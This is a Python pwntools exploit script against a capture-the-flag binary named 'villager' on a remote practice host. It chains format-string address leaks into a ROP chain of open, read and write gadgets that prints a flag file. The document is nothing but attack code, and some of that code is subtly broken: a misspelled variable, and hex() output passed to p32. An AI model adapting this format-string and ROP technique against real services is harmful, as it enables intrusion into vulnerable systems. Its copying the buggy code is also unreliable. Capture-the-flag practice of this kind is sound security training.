import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

elf = ELF("./villager")
# libc = ELF("")
libc = elf.libc

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = "ctfq.sweetduet.info"
    PORT = 10001
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###

open_offset = 0xd24a0
read_offset = 0xd2920
write_offset = 0xd29a0
pop2_ret_off = 0x2a60b
pop3_ret_off = 0x12db2f


    ###main###
def main():
    logging.info("main!!")
    
    ###payload###
    #payload = p32(open_addr)
    
    _ = target.recvuntil("name?\n")
    target.sendline(b"AAAA%78$p")
    buf_addr = int(target.recvuntil("\n")[8:18], 16)
    ret_addr = buf_addr + 4
    buf_addr = buf_addr
    logging.info(ret_addr)

    _ = target.recvuntil("name?\n")
    target.sendline(b"BBBB%91$p")
    main_ret_addr = target.recvuntil("\n")[8:16]
    logging.info(main_ret_addr)
    libc_base_addr = int(main_ret_addr, 16) - 241
    logging.info(libc_base_addr)
    logging.info(type(libc_base_addr))

    open_addr = libc_base_addr + open_offset
    read_addr = libc_base_addr + read_offset
    write_addr = libc_base_addr + write_offset

    pop2_ret_addr = libc_base_addr + pop2_ret_off
    pop3_ret_addr = libc_base_addr + pop3_ret_off

    payload_len = 4 * 14
    
    payload = [
        p32(open_addr),
        p32(pop2_ret_addr),
        p32(buf_addr + payload_len + 4),
        p32(0),
        p32(read_addr),
        p32(pop3_ret_addr),
        p32(3),
        p32(buf_addr + payload_len + 4),
        p32(255),
        p32(write_addr),
        p32(pop3_ret_addr),
        p32(1),
        p32(buf_addr + payload_len + 4),
        p32(255),
        b"/home/q23/flag.txt" + p32(0)
    ]

    for i, pay in enumerate(payload):
        logging.info(pay)
        _ = target.recvuntil("name?\n")
        target.sendline(fmtstr_payload(7, {p32(hex(ret_addr + 4 * i)):pay}, numbwritten = 4 * i, write_size='short'))


    _ = target.recvuntil("name?\n")
    target.sendline("")
    ret = targt.recvline()
    print(ret)
                  
    
if __name__ == "__main__":
    main()


            
